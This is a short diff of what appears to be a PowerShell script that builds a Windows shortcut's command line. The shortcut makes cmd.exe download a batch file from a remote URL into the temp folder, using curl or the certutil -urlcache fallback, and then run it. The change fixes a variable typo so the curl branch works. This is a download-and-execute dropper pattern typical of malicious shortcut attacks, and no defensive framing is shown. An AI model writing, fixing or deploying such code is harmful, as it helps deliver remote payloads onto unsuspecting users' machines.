@@ -61,7 +61,7 @@ $cmd = '%SystemRoot%\System32\cmd.exe'
 $tmp = '%TEMP%\initad.bat'
 
 if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
-    $lnkArgs = '/c ' + $q + 'curl -s -o ' + $q + $tmp + $q + ' ' + $q + $url + $q + ' ' + $aa + ' call ' + $q + $tmp + $q + $q
+    $lnkArgs = '/c ' + $q + 'curl -s -o ' + $q + $tmp + $q + ' ' + $q + $url + $q + ' ' + $a + ' call ' + $q + $tmp + $q + $q
 } else {
     $lnkArgs = '/c ' + $q + 'certutil -urlcache -split -f ' + $q + $url + $q + ' ' + $q + $tmp + $q + ' ' + $a + ' ' + $q + $tmp + $q + $q
 }
